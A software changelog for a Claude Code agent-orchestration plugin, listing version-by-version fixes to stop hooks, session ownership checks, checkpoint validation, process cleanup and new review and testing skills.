- **arc-phase-stop-hook.sh**: Eliminated three sites that deleted the live `$STATE_FILE` on transient I/O failure during the compact-interlude state machine (lines 1357, 1381, 1384). The inline implementation had drifted from the hardened library version (`lib/arc-stop-hook-common.sh:248-251, 325-328`) — any transient `mktemp`/`awk`/`sed`/`mv` failure would permanently terminate the arc phase loop with no user-visible signal. Now matches library behavior: preserves state file for retry, logs via `_trace`, only removes the `_STATE_TMP` scratch file. Direct fix for "không go next phase" stalls on long arcs that cross the compact threshold (work, code_review, mend phases).
- **detect-stale-lead.sh**: Removed PPID-based ownership fallback at line 248 that contradicted CLAUDE.md rule 11 (`$PPID` is NOT consistent between hook invocations and skill `Bash()` calls). The fallback wrongly classified the OWNING session's live workflow as "different session" and skipped waking the team lead — directly causing phase-stall symptoms on legacy state files (pre-v1.144.16) that lack `session_id`. State files without `session_id` now defer to `detect-workflow-complete.sh`, which uses reliable process-liveness checks instead of unreliable PPID equality.

## [2.46.1] - 2026-04-13

### Fixed
- **detect-stale-lead.sh**: Initialize `_session_id=""` before conditional loop — variable was only set inside `if [[ -f "$loop_file" ]]` block but referenced at lines 235 and 276 outside it, causing `unbound variable` crash with `set -u`

## [2.46.0] - 2026-04-12

### Added
- **skill-testing --improve**: Convergence loop mode that chains test → categorize → fix → re-test in up to N iterations (default 3, max 5). Includes per-iteration change delta reporting, semantic change guard (structural fixes only — workflow logic never modified), and echo persistence for cross-skill pattern tracking. New reference file `references/improve-mode.md` documents the full algorithm.

### Changed
- **skill-testing**: Expanded `allowed-tools` from `Read, Glob, Grep` to include `Edit, Write, Bash` for `--improve` mode support. Added `argument-hint` for CLI autocomplete.

## [2.45.0] - 2026-04-12

### Added
- **prompt-linter**: 8 new prompt quality lint rules (AGT-017 through AGT-024) adapted from Prompt Master v1.5.0 anti-pattern taxonomy. Rules check starting state definition, completion criteria, precise task verbs, success criteria, scope boundaries for write agents, responsibility overload, grounding anchors for review agents, and context budget guidance. Total rules: 24 (16 structural + 8 prompt quality).
- **prompt-quality-patterns.md**: New reference file mapping Prompt Master patterns to Rune lint rules with detection regexes, severity assignments, and exemption logic. Documents 8 adopted and 27 not-adopted patterns with rationale.

### Changed
- **self-audit**: Updated CLAUDE.md self-audit skill description to include prompt quality assessment coverage and 24-rule count.

### Note
- Self-audit dimension scores may decrease after this update due to new prompt quality checks surfacing previously undetected issues. This is expected — the rules are P2 (Warning) and P3 (Info) severity only, with no new P1 (Error) rules.

## [2.44.1] - 2026-04-11

### Fixed
- **arc-phase-stop-hook.sh**: Fix EXIT trap capturing non-zero exit code when `_rune_fail_forward` stderr write fails — root cause of "Failed with non-blocking status code: No stderr output" error. EXIT trap now forces exit 0 unless intentional exit 2 (M-1)
- **arc-phase-stop-hook.sh**: Fix `_IMMEDIATE_PREV` tracking any non-pending phase (including skipped) instead of only completed — caused compact interlude to misfire on skipped heavy phases (H-1)
- **arc-phase-stop-hook.sh**: Backport FLAW-007 awk `found` counter to compact Phase A insertion — prevents frontmatter corruption when markdown body contains `---` lines (M-3)
- **arc-phase-stop-hook.sh**: Fix jq dot-notation injection risk — all `.phases.${var}.status` patterns now use `--arg p "$var" '.phases[$p].status'` for safety with hyphenated phase names
- **arc-phase-stop-hook.sh**: Fix `${ARC_ID:-unknown}` → `${_ARC_ID_FOR_LOG:-unknown}` in context exhaustion messages — was always showing "unknown"
- **arc-phase-stop-hook.sh**: Fix crash signal off-by-one — change `-gt 60` to `-ge 60` for cleanup threshold
- **detect-stale-lead.sh**: Fix `$_LOOP_FM` (uppercase) case mismatch — should be `$_loop_fm` (lowercase) as set on line 107. Session_id ownership check was silently broken (C-1)
- **detect-stale-lead.sh**: Add missing `source lib/frontmatter-utils.sh` — `_get_fm_field` was undefined, causing ERR trap abort whenever arc loop files exist (C-1)
- **detect-workflow-complete.sh**: Add `session_id` as primary ownership check in GUARD 2 (loop file defer) — `$PPID` is unreliable in hook context per CLAUDE.md rule #11 (C-2)
- **detect-workflow-complete.sh**: Add `session_id` check in GUARD 2.5 (checkpoint freshness) — same PPID inconsistency fix (C-3)
- **detect-workflow-complete.sh**: Fix timeout budget guard using `HOOK_START_TIME` (post-guard) instead of `_HOOK_START_EPOCH` (true start) — budget was 3-5s shorter than intended (H-7)
- **detect-workflow-complete.sh**: Change `continue` to `exit 0` for legacy loop file mtime failure — conservatively defer entire hook instead of skipping one file (M-10)
- **on-session-stop.sh**: Add conservative defer fallback for GUARD 5d — when `_check_loop_ownership` returns 1 but phase loop file exists and is fresh (<150 min), defer with exit 0 instead of falling through to cleanup (H-2)
- **on-session-stop.sh**: Add `session_id` as primary ownership signal at 3 cleanup sites (BUILD STATE FILE TEAM SET, Phase 2, Phase 3) — `$PPID` fallback only when session_id unavailable (H-4)
- **on-session-stop.sh**: Add timeout budget guard (3s) to signal dir cleanup loop — prevents O(N×M) jq calls from exhausting 10s hook timeout (M-12)
- **on-session-stop.sh**: Return 1 (ownership unknown) instead of 0 (allow cleanup) when `_check_loop_ownership` finds empty YAML frontmatter — prevents corrupt files from triggering cleanup of another session's state (M-13)
- **stop-hook-common.sh**: Widen `_iso_to_epoch()` to accept non-UTC timestamps (`+HH:MM`/`-HH:MM` offsets) — GUARD 10 rapid-iteration check was silently bypassed for non-UTC timezones (C-4)
- **stop-hook-common.sh**: Fix fractional-seconds stripping to handle non-Z suffixes (M-4)
- **stop-hook-common.sh**: Add `:-0` default after `_stat_mtime` in `_validate_session_ownership_core` — prevents arithmetic failure on empty result (H-9)
- **stop-hook-common.sh**: Replace `$(id -u)` with `${_RUNE_UID:-$(id -u)}` in `_check_context_at_threshold` — avoids subprocess fork per invocation (H-3)
- **arc-stop-hook-common.sh**: Add `:-0` defaults after both `_stat_mtime` calls in `arc_guard_context_critical_with_stale_bridge` — prevents integer comparison failure on empty strings (H-8)
- **hooks.json**: Increase `on-session-stop.sh` timeout from 5s to 10s — 5s was insufficient for projects with 50+ state files (~200+ jq subprocess calls) (H-11)

### Fixed (Mend Pass — Post-Review)
- **stop-hook-common.sh**: Fix `_iso_to_epoch` fractional-second stripping destroying timezone suffix for non-UTC timestamps — `${ts##*[0-9]}` consumed `+09:00` suffix. Now uses regex capture groups (FLAW-008)
- **arc-phase-stop-hook.sh**: Fix fallback `_IMMEDIATE_PREV` loop accepting skipped/failed phases — diverged from fixed jq primary path that correctly restricts to `completed` only (FLAW-001)
- **detect-stale-lead.sh**: Complete session_id migration at 3 remaining PPID-only sites — state file ownership check, debounce marker read-back, and mtime-invalid defer path (SEC-004, FLAW-002, BACK-007)
- **arc-stop-hook-common.sh**: Add `-${PPID}` suffix to verbose ERR trap trace log path — was shared across concurrent debug sessions (SEC-001)
- **arc-phase-stop-hook.sh**: Remove `rm -f "$STATE_FILE"` from mktemp/sed failure paths — preserves arc state on transient filesystem errors, matching `arc_compact_interlude_phase_b` pattern (FLAW-009)
- **arc-phase-stop-hook.sh**: Add EXIT trap trace logging when converting unexpected exit codes to 0 (BACK-004)
- **arc-phase-stop-hook.sh**: Standardize `_stat_mtime` with `:-0` default at compact interlude (PAT-002)
- **enforce-sleep-background.sh**: Remove dead duplicate ERR trap, add RUNE_TRACE logging, document regex scope limitation, use `jq -n` for JSON output safety (PAT-003, SEC-003, SEC-005, BACK-005)
- **on-session-stop.sh**: Add trace logging for GUARD 5d conservative defer (BACK-003)
- **CLAUDE.md**: Update on-session-stop.sh timeout documentation from 5s to 10s (BACK-008)

## [2.44.0] - 2026-04-10

### Added
- **Review context building**: Phase 0.6 in appraise spawns `context-builder` agent to produce architectural context map (trust boundaries, data flows, state invariants, entry points, key dependencies) before Ash review begins
- **Context map injection**: `buildAshPrompt()` injects Phase 0.6 context map into every Ash's spawn prompt as pre-loaded architectural knowledge, reducing redundant comprehension work
- **`context_map` inscription field**: New `inscription.json` field carries context-builder output through the orchestration pipeline (null when skipped/failed)
- **Talisman `review.context_building`**: New config gate (`auto`/`always`/`never`) with configurable thresholds (`context_building_threshold.lines`, `context_building_threshold.files`) and timeout (`context_building_timeout`)
- Auto mode triggers when diff exceeds 500 lines or touches 5+ files; skipped for `--dry-run`

## [2.43.4] - 2026-04-10

### Fixed
- **elicitation-result-validator.sh**: Add missing `trap 'exit 2' ERR` to SECURITY hook — crash previously exited with code 1 (non-blocking) instead of 2 (deny), allowing malicious elicitation responses through (PAT-001)
- **arc-phase-stop-hook.sh**: Remove `$STATE_FILE` from `rm -f` on compact Phase A `mv` failure — previously deleted both temp and state files, permanently killing the arc phase loop with no recovery (FLAW-003, BACK-004 alignment)
- **arc-phase-stop-hook.sh**: Gate `NEXT_PHASE` override on successful checkpoint write — previously set unconditionally, causing phase regression on transient filesystem errors (FLAW-002)
- **arc-phase-stop-hook.sh**: Add `done` flag to test_finalized awk insertion — prevents duplicate field insertion when state file body contains `---` lines (FLAW-007)
- **on-stop-failure.sh**: Fix `.phases` jq query from array to object schema — `next_phase` was always empty due to schema mismatch with arc checkpoint format (FLAW-011)
- **enforce-readonly.sh**: Remove dead `_rune_fail_forward()` function from SECURITY hook — maintenance hazard that could accidentally convert fail-closed to fail-open (SEC-001)
- **validate-strive-worker-paths.sh**: Resolve fail-forward/fail-closed classification contradiction — ERR trap was `exit 0` but jq guard was `exit 2`. Now consistently OPERATIONAL with proper `_rune_fail_forward` trap (SEC-003)
- **validate-gap-fixer-paths.sh**: Same fail-forward classification fix as validate-strive-worker-paths.sh (SEC-003)
- **sensitive-patterns.sh**: Replace `$(())` arithmetic validation with regex — prevents potential arithmetic injection in `rune_strip_sensitive()` (SEC-009)
- **elicitation-logger.sh**: Use `--arg` instead of `--argjson` for untrusted input; extract `.response` field only — reduces log injection surface (SEC-005)
- **enforce-teams.sh**: Cache `_RUNE_UID` at script start and add PID scope to trace log path — eliminates subprocess fork on every ERR trap invocation (SEC-006)
- **on-session-stop.sh**: Check both `status` and `active` fields in GUARD 5b hierarchy check — prevents premature cleanup when hierarchy state file only has `active: true` (FLAW-004)
- **detect-stale-lead.sh**: Use `session_id` from hook input for ownership check with PID fallback — PPID is unreliable in hook context (FLAW-005)
- **detect-corrections.sh**: Use `session_id` for debounce key instead of PPID — prevents debounce failure across hook invocations (FLAW-008)
- **suggest-self-audit.sh**: Increase stdin read cap from 64KB to 1MB — consistent with all other hooks, prevents JSON truncation (FLAW-006)
- **enforce-gh-account.sh**: Add PID scope to trace log path — prevents write race on shared Linux `/tmp` (COMPAT-002)
- **pretooluse-write-guard.sh**: Remove inline state file deletion for dead PIDs — defer cleanup to session-team-hygiene.sh to prevent privilege-to-cleanup escalation (SEC-008)
- **advise-mcp-untrusted.sh**: Add `agent-search` to matched tools documentation — aligns with hooks.json matcher (PAT-005)
- **PAT-003**: Add `umask 077` to 6 scripts missing it (advise-mcp-untrusted, context-percent-stop-guard, detect-stale-lead, on-stop-failure, suggest-self-audit, verify-agent-deliverables)

## [2.43.3] - 2026-04-10

### Fixed
- **arc-phase-stop-hook.sh**: Re-parse FRONTMATTER after claim-on-first-touch in GUARD 5.7. Stale in-memory FRONTMATTER (still containing `session_id: unknown`) caused GUARD 5.8 INTEG-005 to reject valid state files on the very first Stop hook invocation, silently killing every arc before its second phase
- **stop-hook-common.sh**: Increase process tree walk depth from 4 to 8 levels for claim-on-first-touch ancestry verification. Sandbox wrappers, PTY layers, tmux/screen, and Greater-Will orchestration add intermediate processes that exceeded the original depth, causing false ownership rejection
- **stop-hook-common.sh**: Downgrade INTEG-014 (branch drift) from `_integ_fail` to `_integ_warn`. Branch changes during arc execution (detached HEAD, rebase, worktrees, parallel sessions) are legitimate and should not silently kill the pipeline
- **arc-phase-stop-hook.sh**: Preserve STATE_FILE on iteration increment failure instead of deleting it. Transient disk errors (full, permissions) previously caused permanent arc death with no user notification — now the hook exits cleanly and retries on the next invocation

## [2.43.2] - 2026-04-10

### Fixed
- **Bash 3.2 `{n,m}` regex crash**: Replace all `{n,m}` repetition quantifiers in `[[ =~ ]]` across 14 shell scripts — Bash 3.2 (macOS default) does not support ERE `{n,m}` in `=~`, causing "invalid repetition count" errors that silently kill arc phase Stop hooks via ERR trap. Critical fix for `arc-phase-stop-hook.sh:146` (root cause of phase loop death on all repos), `lib/stop-hook-common.sh:939` (`_iso_to_epoch` crash), and `lib/platform.sh` (timestamp parsing). Uses explicit `[0-9][0-9]` repetition or `+`/`*` with `${#var}` length checks
- **test-cross-platform.sh**: Replace `mapfile` (Bash 4+) with `while read` loop for Bash 3.2 compatibility

## [2.43.1] - 2026-04-10

### Fixed
- **enforce-team-lifecycle.sh**: Fix `bad substitution` error on macOS Bash 3.2 — replaced `${TEAM_NAME//$'\0'/}` (unsupported null byte in parameter expansion) with portable `tr -d '\0'` pipe

## [2.43.0] - 2026-04-09

### Added
- **Anti-rationalization framework**: Shared reference file with per-category rationalization rejection tables (Security, Logic & Correctness, Performance, Architecture & Patterns, Documentation)
- **buildAshPrompt() injection**: Auto-injects matching anti-rationalization table based on agent category tags during review (~300 tokens per agent)
- **AGT-016 lint rule**: New prompt-linter rule validates review agents have anti-rationalization category coverage (Warning severity)
- **Pressure test scenarios**: Skill-testing scenarios for rationalization resistance verification

## [2.42.0] - 2026-04-09

### Added
- **verify**: New user-invocable skill (`/rune:verify`) — finding verification gate that classifies TOME findings as TRUE_POSITIVE, FALSE_POSITIVE, or NEEDS_CONTEXT with evidence chains before mend dispatch
- **finding-verifier**: New agent (`agents/utility/finding-verifier.md`) — spawned by verify skill to classify individual findings against actual source code
- Arc Phase 6.7 VERIFY: New pipeline phase between `goldmask_correlation` and `mend` that auto-runs finding verification on TOME output
- Mend verdict filtering: `parse-tome.md` now checks VERDICTS.md and excludes FALSE_POSITIVE findings from mend-fixer dispatch (backward compatible — skipped when no VERDICTS.md exists)
- Skip condition: `arc.verify.enabled: false` or `--no-verify` flag disables verification phase
- Routing table entries for verify in using-rune, tarnished, and CLAUDE.md

## [2.41.0] - 2026-04-09

### Added
- **codex-status**: New user-invocable skill (`/rune:codex-status`) — shows Codex activity summary for current/recent arc run with phase status, finding counts, and simplified verification verdicts (AC-2, AC-3)
- **arc-codex-phases**: User-visible `[Codex]` summary lines emitted after Phase 2.8 (Semantic Verification) and Phase 5.6 (Gap Analysis) complete — one line per phase with progressive disclosure (AC-1, AC-4)
- Simplified verdict labels: `CROSS-VERIFIED` → "Both models agree", `DISPUTED` → "Models disagree — review recommended" (AC-3)
- Routing table entries for codex-status in using-rune, tarnished, and CLAUDE.md

## [2.40.0] - 2026-04-09

### Added
- Frontend knowledge skills auto-loaded by stacks context router (#v2.40.0)
  - `react-performance-rules`: React/Next.js performance optimization (69 rules)
  - `web-interface-rules`: Web interface quality (100+ rules)
  - `react-composition-patterns`: Compound components, React 19 APIs
  - `react-view-transitions`: View Transition API integration
  - `react-native-patterns`: React Native/Expo best practices
- React Native/Expo detection in `detectStack()` (app.json, metro.config.js, android+ios directories)
- `mobile` domain classification in context router
- Forge Gaze topic registry for 5 frontend knowledge skill topics
- React 19 version detection for composition patterns gating

## [2.39.0] - 2026-04-09

### Added
- 6 review agents enhanced with frontend-specific rule sections (ember-oracle, pattern-seer, ux-heuristic-reviewer, ux-interaction-auditor, ward-sentinel, design-system-compliance-reviewer)
- React Performance Reviewer specialist prompt (RPR-001 through RPR-010)
- Web Interface Reviewer specialist prompt (WIR-001 through WIR-010)

## [2.38.0] - 2026-04-09

### Added
- **react-performance-rules**: New knowledge skill — 69 React/Next.js performance rules across 8 categories (waterfalls, bundle, server, client, re-render, rendering, JS, advanced). Non-invocable, auto-loaded by Stacks
- **web-interface-rules**: New knowledge skill — 100+ code-level web interface rules across 15 categories (accessibility, forms, animation, typography, performance, dark mode, i18n, anti-patterns). Non-invocable, auto-loaded for frontend files
- **react-composition-patterns**: New knowledge skill — 8 React composition patterns (compound components, state lifting, explicit variants, React 19 APIs). Non-invocable, auto-loaded for React 19+
- **react-view-transitions**: New knowledge skill — React View Transition API guide with CSS recipes and Next.js integration. Non-invocable, auto-loaded when ViewTransition detected
- **react-native-patterns**: New knowledge skill — 16+ React Native/Expo best practices across 8 categories (FlashList, Reanimated, native navigation, expo-image, safe areas, monorepo). Non-invocable, auto-loaded for RN/Expo projects

## [2.37.0] - 2026-04-09

### Added
- **statusline**: Show `⎇wt` worktree indicator next to branch name when `workspace.git_worktree` is present (CC v2.1.97)
- **statusline**: Add `is_worktree` boolean to bridge file JSON for downstream consumers
- **statusline**: Add 4 worktree test cases (indicator presence/absence, bridge field true/false)

## [2.36.1] - 2026-04-09

### Added
- **statusline**: Add `refreshInterval: 10` to hooks.json for auto-refreshing context bar every 10 seconds (CC v2.1.97)
- **talisman**: Add `statusline.refresh_interval` config option to talisman-example.yml

## [2.36.0] - 2026-04-09

### Added
- **codex-review**: Add `--adversarial` flag for [EXPERIMENTAL] challenge-mode review that questions design decisions, not just bugs (AC-1, AC-2)
- **codex-review**: Adversarial prompt templates for all 9 agents (5 Claude + 4 Codex) with `DECISION_CHALLENGED` blocks proposing alternative approaches (AC-3)
- **codex-review**: Adversarial finding prefixes: `XADV-SEC/BUG/QAL/DEAD/PERF` (Claude), `CDXA-S/B/Q/P` (Codex)
- **codex-review**: New reference file `adversarial-prompts.md` with template selection function

### Unchanged
- Standard review behavior when `--adversarial` is not passed (AC-4)

## [2.35.1] - 2026-04-08

### Fixed
- **arc-phase-browser-test.md**: Fix `generateTestPlan()` call signature to match canonical 5-parameter definition in test-plan-generation.md (BACK-001)
- **arc-phase-browser-test.md**: Fix phantom config path `testing.browser_test` → `testing.browser` to match talisman-defaults.json structure (BACK-002)

## [2.35.0] - 2026-04-08

### Added
- **agents**: Add `initialPrompt` to 5 research agents and 2 work agents for faster startup (Claude Code v2.1.83)
- **talisman**: Add `environment:` section with `scrub_subprocess_credentials` and `sandbox_fail_if_unavailable` recommendations

### Changed
- **CLAUDE.md**: Document TaskOutput deprecation (v2.1.83) as Core Rule 15
- **CLAUDE.md**: Document FileChanged/CwdChanged hook evaluation decision (deferred)

## [2.34.3] - 2026-04-06

### Fixed
- **process-tree.sh**: Protect statusline/powerline UI processes from being killed on session stop (MCP-PROTECT-005). These run as `node`/child processes, so the `"claude"` fallback filter matched and killed them. Added broad `*statusline*` and `*claude-powerline*` patterns to the infrastructure protection layer alongside existing connector detection

## [2.34.2] - 2026-04-06

### Fixed
- **process-tree.sh**: 3-layer MCP/LSP server protection (MCP-PROTECT-004). Layer 1: Known binary whitelist covering 60+ MCP servers (Rune, Anthropic official, @modelcontextprotocol/*, database, cloud, browser, search, UI libraries) and 18+ LSP servers. Layer 2: Transport markers (`--stdio`, `--lsp`, `--sse`, `--transport`). Layer 3: Generic pattern matching with both prefix (`mcp-foo`) and suffix (`foo-mcp`) patterns. Fixes `context7-mcp` being killed on session stop — binary name ends with `-mcp` which the old `*mcp-*` prefix-only pattern missed. Also adds `uvicorn` and `fastmcp` detection for Python MCP servers

## [2.34.1] - 2026-04-06

### Fixed
- **process-tree.sh**: Broaden MCP server detection from enumerated patterns to broad prefix matching (`*mcp-*|*mcp_*`). Fixes `mcp-remote` SSE proxy processes being killed on session stop (MCP-PROTECT-001). Previously only `--stdio` transport and specific binary names were protected — now any process with `mcp-` or `mcp_` in its cmdline is safe
- **session-team-hygiene.sh**: Sync inline MCP protection check with broad pattern matching (`--stdio`, `--lsp`, `mcp-*`, `mcp_*`, `python*mcp*`, connectors)

## [2.34.0] - 2026-04-04

### Changed
- **process-tree.sh**: Add MCP-PROTECT-003 — positive teammate PID whitelist. New `_collect_teammate_pids()` reads SDK config.json + signal files, verifies each PID (alive, Claude process, not MCP/LSP) before returning. New `"teammates"` filter mode for `_rune_kill_tree()`. Enhanced `_is_mcp_server()` with --lsp, known MCP binary patterns, and Claude connector detection. Added `_describe_process()` for trace logging before kills (read-first, kill-second discipline)
- **on-session-stop.sh**: Flip `RUNE_DISABLE_AUTO_CLEANUP` default from `1` to `0` — cleanup is now ENABLED by default. Uses `"teammates"` filter with positive PID whitelist. Add talisman `process_management.auto_cleanup` config support
- **detect-workflow-complete.sh**: Same default flip and `"teammates"` filter upgrade. Add talisman config support
- **session-team-hygiene.sh**: Same default flip and talisman config support
- **track-teammate-activity.sh**: Write teammate PID signal files (`{agent-name}.pid`) as secondary PID source for the whitelist
- **context-percent-stop-guard.sh**: Fix stale comment about hook ordering
- **CLAUDE.md**: Add Iron Law PROC-001 (Read Before Kill) — Claude Code must read and classify process list before killing any PID
- **engines.md**: Update step 5a to use read-first-kill-second protocol with `"teammates"` filter and LLM-in-the-loop classification
- **project CLAUDE.md**: Update step 5a cleanup pattern with mandatory process list review before kill

## [2.33.0] - 2026-03-31

### Changed
- **arc-quick**: Add mend phase — pipeline is now 4 phases (plan → work+evaluate → review → mend). Mend runs conditionally when TOME contains P1/P2 findings, skips gracefully otherwise. Closes the feedback loop so review findings get auto-resolved in the same pipeline run.

## [2.32.1] - 2026-03-31

### Changed
- **pr-guardian**: Add `--disable-auto-merge` flag for monitor-only mode — watches PR, fixes issues, but skips auto-merge

## [2.32.0] - 2026-03-31

### Added
- **pr-guardian skill**: Automated PR shepherd loop — cron-based (every 5 min) that checks review comments, runs local lint/typecheck gate, monitors CI/CD, rebases onto main, starts Docker services, detects/resolves migration conflicts (Alembic, Django, Rails, Prisma, Sequelize, Knex, TypeORM), applies pending migrations with round-trip verification, runs browser tests, and auto-merges when all green. 7-day auto-expiry. `/rune:pr-guardian [PR#]`
- **test-browser deep testing** (`--deep`): 5-layer deep testing beyond smoke tests — interaction testing (form fill, button clicks), data persistence (submit → navigate → verify), visual/layout inspection (overflow, spacing, touch targets, responsive breakpoints), UX logic (empty states, loading, a11y, error handling), data diagnosis (HAR-based null/empty root cause analysis)
- **test-browser cross-screen workflow continuity**: Create→List→Edit→Save CRUD lifecycle testing across related routes — detects data not persisting between screens, edit pages not pre-populated, list pages missing created data
- **test-browser backend impact tracing**: When PR has only backend/API/database changes, traces impact forward (backend file → API endpoint → frontend consumer → page → route) to discover and test consuming frontend routes. 4-layer tracing: direct endpoints, model/migration impact, service layer, resource name fallback
- **test-browser data diagnosis layer**: Table empty column detection (>50% null), raw null/undefined display detection, detail view empty field analysis, HAR-based root cause analysis (API error vs API null fields vs empty array vs UI rendering issue)

### Changed
- **test-browser**: Updated description, workflow overview, and talisman config to reflect deep testing capabilities. Added `--deep` flag support with auto-cap to 3 routes
- **using-rune**: Added pr-guardian routing entry
- **tarnished**: Added pr-guardian to intent-patterns and skill-catalog

## [2.31.1] - 2026-03-30

### Fixed
- **figma-context MCP server**: Fix env var name for `figma-developer-mcp@0.8.0` — package now expects `FIGMA_API_KEY` instead of the deprecated `FIGMA_ACCESS_TOKEN`, causing "Failed to reconnect" on startup

## [2.31.0] - 2026-03-30

### Added
- **Arc operational reliability**: Stop hook persistence (`arc-phase-stop-hook.sh`) — arc pipeline state now survives session crashes, enabling reliable resume with `/rune:arc --resume`
- **`skip_phases` talisman config**: New option to skip specific arc phases (e.g., skip forge for quick iterations). Configured via `arc.skip_phases` in `talisman.yml`
- **Heartbeat scanner improvements**: Enhanced `arc-heartbeat-writer.sh` for better detection of stale/stuck phases
- **Session team hygiene**: New `session-team-hygiene.sh` script for orphaned team cleanup across sessions at startup/resume
- **Arc phase constants**: New `arc-phase-constants.md` reference with phase order and skip support
- **Stop hook persistence test suite**: 247-line test suite (`test-stop-hook-persistence.sh`) covering crash recovery scenarios

### Fixed
- **SEC: jq injection guard** — sanitize shell variables before interpolation in jq expressions (P1 security)
- **Division-by-zero protection** — guard against zero denominator in persistence budget check (RP-002)
- **Session isolation enforcement** — stricter ownership validation in gap analysis findings
- **Budget warning improvements** — clearer messaging when persistence budget is exceeded

## [2.30.1] - 2026-03-30

### Fixed
- **CKPT-INT-007: Duplicate JSON key detection + auto-fix in checkpoint validation** — LLM-generated checkpoints can produce duplicate top-level keys (e.g., `phase_sequence` written at init AND during `updateCheckpoint()`). Most JSON parsers silently use the last value, but this is a data integrity bug. The stop hook's `validate_checkpoint_json_integrity()` now detects duplicates via Python `object_pairs_hook` (with grep fallback) and auto-fixes by re-serializing through `jq`

### Added
- **`checkpoint-update.sh`**: Deterministic `jq`-based checkpoint merge utility (`scripts/lib/checkpoint-update.sh`). Replaces error-prone LLM JSON serialization with atomic read → merge → validate → write pipeline. Supports `--phase-update` mode that routes fields to `.phases[name]` vs top-level automatically. Backup rotation (last 3), post-write validation, and restore-on-failure
- **`checkpoint-validate.sh`**: Standalone checkpoint validator (`scripts/lib/checkpoint-validate.sh`) with 7 checks: valid JSON (CKPT-VAL-001), duplicate keys (CKPT-VAL-002), required fields (CKPT-VAL-003), phase_sequence integrity (CKPT-VAL-004), phase statuses (CKPT-VAL-005), unknown keys (CKPT-VAL-006), schema version range (CKPT-VAL-007). Supports `--fix` for one-shot repair
- **`detect_duplicate_keys()` in Python validator**: New function in `tests/helpers/checkpoint_validator.py` for test-level duplicate key detection. `validate_checkpoint()` now accepts optional `filepath` param to enable raw-file duplicate checks
- **`updateCheckpoint()` formal definition**: Documented merge semantics, implementation pseudocode, and script-based alternative in `arc-phase-constants.md`
- **5 new tests**: `TestDuplicateKeyDetection` class in `test_checkpoint.py` — covers clean JSON, single duplicate, multiple duplicates, filepath-aware validation, and no-filepath skip

## [2.30.0] - 2026-03-29

### Added
- **Data flow integrity verification**: New `flow-integrity-tracer` review agent (`agents/review/flow-integrity-tracer.md`) — traces field-level data flow across UI↔API↔DB layers. Detects field phantoms, persistence gaps, roundtrip asymmetry, display ghosts, schema drift. FLOW- finding prefix. Conditional activation: 2+ stack layers in diff
- **Inspect Dimension 11**: Data Flow Integrity (DFLOW- prefix) — traces fields through plan requirements to implementation layers
- **Talisman config**: New `data_flow` section with `enabled` (default: true), `min_layers` (default: 2), severity overrides
- **CRUD roundtrip tests**: Trial-forger generates field persistence property tests when models/serializers in diff
- **Devise Phase 0.8**: Field persistence gap scanning in issue discovery
- **Agent registry**: `flow-integrity-tracer` added (plugin total: 151 agents — 108 core + 43 extended)

## [2.29.8] - 2026-03-28

### Fixed
- **INTEG-001 (P0): 3-layer arc state file integrity validation** — Prevents LLM variable substitution drift where `config_dir` gets written as `tmp/arc/...` instead of `CLAUDE_CONFIG_DIR`, cross-run ID mismatches between `checkpoint_path` and `config_dir`, and empty `owner_pid`/`session_id` fields that break session isolation
  - **Layer 1 (Pre-Write)**: 6 assertions in `arc-checkpoint-init.md` and 5 in `arc-resume.md` fire BEFORE `Write()` to catch wrong variable usage at source
  - **Layer 2 (Post-Write)**: Cross-field verification reads back the state file after `Write()` and compares every field against the source variable to catch template interpolation bugs
  - **Layer 3 (Runtime)**: GUARD 5.8 (`validate_state_file_integrity()`, 15 INTEG rules) and GUARD 8.5 (`validate_checkpoint_json_integrity()`, 6 CKPT-INT rules) in `arc-phase-stop-hook.sh` validate metadata before every phase dispatch
  - Writes diagnostic to `.rune/arc-integrity-failure.txt` on validation failure for post-mortem analysis
  - Documents known corruption vectors and detection matrix in `arc-phase-loop-state.md`
  - Edge case coverage: partial cancel detection (INTEG-012), zombie loop (INTEG-013), branch drift (INTEG-014), cancel inconsistency (INTEG-015)

## [2.29.7] - 2026-03-28

### Fixed
- **FLAW-001 (P1): Remove RETURN trap leak in rune-state.sh** — `trap ... RETURN` in `_rune_migrate_legacy()` leaks to callers on bash 4.0+ (Linux). Replaced with explicit `rmdir` cleanup at function exit point
- **FLAW-002 (P1): Add numeric validation to platform.sh epoch fallback** — `_parse_iso_epoch_ms` fallback chain now validates output with `[[ =~ ^[0-9]+$ ]]` after each attempt. Non-numeric values fall through to next fallback
- **ARCH-002 (P1): Update phase count 43 → 44** — Corrected phase count in arc/SKILL.md, plugin README, and root README to match actual PHASE_ORDER array (44 phases)
- **SEC-005 (P2): Per-fixer file scope in validate-mend-fixer-paths.sh** — Replaced flat union allowlist with per-fixer scoping via TRANSCRIPT_PATH agent name extraction and inscription.json lookup
- **FLAW-004 (P2): Fix inverted nullglob boolean in workflow-lock.sh** — Changed `0`/`1` to `false`/`true` with matching comparison to eliminate boolean inversion refactoring hazard
- **FLAW-005 (P2): Compose EXIT traps in codex-exec.sh** — Capture existing EXIT trap before overwriting; new `_cleanup()` runs both handlers via `eval`
- **FLAW-006 (P2): Add 1MB stdin cap to pr-comment-formatter.sh** — Prevents memory exhaustion from unbounded stdin. Detects truncation and injects warning
- **FLAW-007 (P2): Fix fuzzy substring match in echo-promote.sh** — Changed `*"${_pid##*/}"*` glob (substring) to `"${_pid##*/}"` (exact match) to prevent wrong entry promotion
- **FLAW-008 (P2): Fix mv-into-dir in workflow-lock.sh** — Added `rm -rf "$lock_dir"` before `mv` at both restore points to prevent stale being moved into existing directory
- **FLAW-010 (P2): Fix arithmetic injection in sanitize-text.sh** — Replaced `$(( "${max_chars}" + 0 ))` with regex validation `[[ =~ ^[0-9]+$ ]]` before arithmetic use
- **Cross-model review fixes**: Resolved XVER-SEC-001, CDX-BUG-001/002/003 in enforce-bash-timeout.sh, guard-context-critical.sh, mcp-pkg-manager.sh, resolve-session-identity.sh

## [2.29.3] - 2026-03-28

### Fixed
- **VEIL-002 (P1): Add process liveness check to adaptive grace period** — `engines.md` shutdown pseudocode now uses `pgrep -P` to detect hung teammate processes before declaring "all dead". Prevents premature 2s grace period when teammates are alive but unresponsive to SendMessage
- **VEIL-001 (P1): Document Signal 4 advisory-only as accepted risk** — Added compensating controls documentation in `enforce-teams.sh` explaining why Signal 4 was downgraded from hard deny (v2.4.2) with explicit bootstrap window risk acknowledgment
- **PHNT-001 (P1): Correct DECREE-003 false validation claim** — Updated `arc-phase-cleanup.md` to mark DECREE-003 PHASE_PREFIX_MAP sync as manual verification, replacing incorrect claim of automated validation in `audit-agent-registry.sh`
